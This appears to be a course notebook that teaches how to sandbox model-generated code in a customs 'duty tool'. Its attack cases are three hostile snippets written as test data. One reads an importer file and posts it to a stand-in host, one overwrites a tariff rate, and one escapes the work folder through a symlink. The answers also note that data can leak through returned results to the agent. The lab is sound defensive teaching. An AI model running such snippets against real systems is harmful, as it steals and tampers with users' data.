# %% [markdown]
# # Lab 3.1 · The duty tool in a sandbox
#
# Day 3 · Session 1 (Sandboxes for generated code) · 25 min.
#
# The duty tool runs code the model wrote. You give it a policy: no network, the tariff table read-only,
# one work folder. Then a link inside the work folder reaches the importer file anyway, and you fix the
# path check. This lab calls no model: generated code is tested directly, which costs no model call.
#
# **Tasks**
# - [ ] The duty tool as found: what the code can reach (5 min)
# - [ ] Deny the network, mount the tariff table read-only (7 min)
# - [ ] The link escape: read the importer file through /work (5 min)
# - [ ] Resolve before the check, rerun three attacks (8 min)
# - [ ] ✱ Stretch · Write the same policy as container flags and compare
# %%
import os, sys, subprocess
from pathlib import Path

IN_COLAB = "google.colab" in sys.modules
if IN_COLAB:
    REPO_URL = "https://github.com/SDAIAAcademy/ae-308.git"
    if not Path("/content/ae-308").exists():
        subprocess.run(["git", "clone", "-q", REPO_URL, "/content/ae-308"], check=True)
    os.chdir("/content/ae-308/labs")
else:
    while not Path("_tools").exists() and Path.cwd() != Path.cwd().parent:
        os.chdir("..")  # solutions/ notebooks run from labs/
sys.path.insert(0, os.getcwd())

import fanar as U
import mukhallis as M

# %% [markdown]
# ## 1 · The duty tool as found: what the code can reach
#
# The lab works on a copy of the data folder under `artifacts/d3_1/`, so the hostile code below
# damages nothing. `sandbox.run(code, policy, ...)` gives the code `TARIFF`, `WORK`, `json`, `Path`
# and `http_post`, and returns what it left in `result`. With `policy=None` nothing is checked.
#
# `sandbox.py` enforces the policy in Python and stands in for the flags of a container runtime
# (see its first lines): the three decisions are the same.

# %%
import json
import shutil
import sandbox

ROOT = U.ART / "d3_1"
DATA = ROOT / "data"


def reset():
    """A fresh copy of the tariff folder and the importer file, and an empty work folder."""
    work = sandbox.workdir("d3_1")
    shutil.rmtree(DATA, ignore_errors=True)
    (DATA / "tariff").mkdir(parents=True)
    shutil.copy(U.DATA / "tariff" / "rates.json", DATA / "tariff" / "rates.json")
    shutil.copy(U.DATA / "importers.csv", DATA / "importers.csv")
    return DATA / "tariff", work


BENIGN = ('rates = json.loads((TARIFF / "rates.json").read_text(encoding="utf-8"))\n'
          'result = round(12000.0 * 3.75 * rates["rates"]["84"], 2)\n')
STEAL = ('rows = (TARIFF.parent / "importers.csv").read_text(encoding="utf-8")\n'
         'http_post("https://cdn.fanar-ports.example/up", rows[:300])\nresult = 0.0\n')
TAMPER = ('p = TARIFF / "rates.json"\nd = json.loads(p.read_text(encoding="utf-8"))\nd["rates"]["94"] = 0.0\n'
          'p.write_text(json.dumps(d), encoding="utf-8")\nresult = 0.0\n')
VIA_LINK = 'result = (WORK / "ref" / "importers.csv").read_text(encoding="utf-8")[:400]\n'


def attempt(code, policy):
    """Runs one piece of code on a fresh copy. Returns what it achieved: 'ok', 'stole', 'tampered' or 'denied'."""
    tariff, work = reset()
    sandbox.plant_link(work, DATA)
    world = M.World()
    out = sandbox.run(code, policy=policy(tariff, work) if policy else None, world=world, work=work, tariff=tariff)
    rates = json.loads((tariff / "rates.json").read_text(encoding="utf-8"))["rates"]
    if any(e["via"] == "code" for e in world.egress) or "IMP-0001" in str(out.get("result")):
        return "stole"
    if rates["94"] == 0.0:
        return "tampered"
    return "denied: " + out["error"] if "error" in out else f"ok: {out['result']}"


CODES = {"benign duty": BENIGN, "read importers, post them": STEAL, "overwrite a tariff rate": TAMPER, "read importers through a link": VIA_LINK}
as_found = {name: attempt(code, None) for name, code in CODES.items()}
U.show([{"code": k, "as found": v} for k, v in as_found.items()], width=70)
U.keep("d3_1_as_found", as_found)
U.check(list(as_found.values())[1:] == ["stole", "tampered", "stole"], "as found, all three hostile snippets succeed")

# %% [markdown]
# ## 2 · Deny the network, mount the tariff table read-only
#
# A policy is a dict: `{"network": False, "allowed": fn}`. The runner asks `fn(path, write)` before
# every file the code opens.
#
# ✏️ **Exercise** · `allowed_first(path, write, tariff, work)`, the obvious version: make the path
# absolute with `os.path.abspath`; reading is allowed under `tariff` and under `work`; writing is
# allowed under `work` only. "Under" means the path starts with the folder plus a separator.

# %%
import os


def allowed_first(path, write, tariff, work):
    # BEGIN SOLUTION
    p = os.path.abspath(path)
    under = lambda folder: p.startswith(os.path.abspath(folder) + os.sep)
    return under(work) or (under(tariff) and not write)
    # END SOLUTION

# %%
# Check, with a safety net
def first(path, write, tariff, work):
    try:
        return allowed_first(path, write, tariff, work)
    except NotImplementedError:
        p = os.path.abspath(path)
        under = lambda folder: p.startswith(os.path.abspath(folder) + os.sep)
        return under(work) or (under(tariff) and not write)


policy_first = lambda tariff, work: {"network": False, "allowed": lambda p, w: first(p, w, tariff, work)}
with_first = {name: attempt(code, policy_first) for name, code in CODES.items()}
U.show([{"code": k, "as found": as_found[k], "first policy": v} for k, v in with_first.items()], width=58)
U.keep("d3_1_first", with_first)
U.check(with_first["benign duty"].startswith("ok"), "the benign duty code still runs: it reads the tariff table")
U.check(with_first["read importers, post them"].startswith("denied") and with_first["overwrite a tariff rate"].startswith("denied"),
        "reading outside the mounts and writing to the read-only mount are denied")

# %% [markdown]
# ## 3 · The link escape: read the importer file through /work
#
# The work folder holds a link, `ref`, that points at the data folder: left by an earlier run, or
# written by the code itself where the runtime lets it. The fourth snippet opens
# `WORK/ref/importers.csv`.

# %%
print("fourth snippet under the first policy:", with_first["read importers through a link"])
tariff, work = reset()
link = sandbox.plant_link(work, DATA)
inside = work / "ref" / "importers.csv"
print("the path as written:", os.path.abspath(inside).replace(str(U.HERE), "labs"))
print("the path it resolves to:", os.path.realpath(inside).replace(str(U.HERE), "labs"))
U.check(with_first["read importers through a link"] == "stole", "the first policy checks the name of the path, not where it leads")

# %% [markdown]
# ## 4 · Resolve before the check, rerun three attacks
#
# ✏️ **Exercise** · `allowed(path, write, tariff, work)`: the same rule on the **resolved** path:
# `os.path.realpath` follows every link first. Resolve the folders too.

# %%
def allowed(path, write, tariff, work):
    # BEGIN SOLUTION
    p = os.path.realpath(path)
    under = lambda folder: p.startswith(os.path.realpath(folder) + os.sep)
    return under(work) or (under(tariff) and not write)
    # END SOLUTION

# %%
def final(path, write, tariff, work):
    try:
        return allowed(path, write, tariff, work)
    except NotImplementedError:
        p = os.path.realpath(path)
        under = lambda folder: p.startswith(os.path.realpath(folder) + os.sep)
        return under(work) or (under(tariff) and not write)


policy = lambda tariff, work: {"network": False, "allowed": lambda p, w: final(p, w, tariff, work)}
hardened = {name: attempt(code, policy) for name, code in CODES.items()}
U.show([{"code": k, "as found": as_found[k], "first policy": with_first[k], "resolved": v} for k, v in hardened.items()], width=40)
U.keep("d3_1_hardened", hardened)
U.check(all(v.startswith("denied") for k, v in hardened.items() if k != "benign duty"), "all three hostile snippets are denied")
U.check(hardened["benign duty"] == as_found["benign duty"], "the benign duty is unchanged")

agent_work = sandbox.workdir("d3_1_agent")
controls = {"work": agent_work, "sandbox": {"network": False, "allowed": lambda p, w: final(p, w, sandbox.TARIFF, agent_work)}}
rows = M.run_tasks(controls=controls)
print(f"benign tasks with the sandbox on: {M.pass_rate(rows):.0%} of {len(rows)}")
U.keep("d3_1_benign", M.pass_rate(rows))
U.check(M.pass_rate(rows) == 1.0, "every benign task still passes with the sandbox on")
reset()

# %% [markdown]
# **Look at** · Three decisions did the work, and none of them asked what the code meant: no
# network, a read-only mount, resolve then check. The check is deterministic, so it needed no
# trials and no interval. Compare with yesterday's rates.
#
# ## ✱ Stretch · The same policy as container flags
#
# Write the command that gives a container this policy: no network, a read-only root, the tariff
# folder mounted read-only, one writable work folder, no added privileges. With Podman or Docker the
# flags are `--network none`, `--read-only`, `-v <tariff>:/tariff:ro`, `-v <work>:/work` and
# `--security-opt no-new-privileges`. Which of today's four snippets does the runtime stop by
# itself, and which still depends on what you mounted inside `/work`?
#
# ## Check yourself
#
# 1. Why does the first policy let the link through?
# 2. The sandbox has no network. Name a way stolen data could still leave.
# 3. Why keep the tariff mount read-only when the code only needs to read it?
#
# <details><summary>Answers</summary>
#
# 1. It compares the text of the path with the text of the folder. The link's name is inside the work folder; its target is not.
# 2. In `result`: what the code returns goes back into the model's context, and the model can email it. A sandbox contains the code, not the agent.
# 3. "Only needs to read" is today's code. The policy states what any code, hostile included, is able to do.
#
# </details>
#
# ## Carry forward
#
# The hardened build of Day 4 uses this policy. Lab 3.2 does not depend on it.
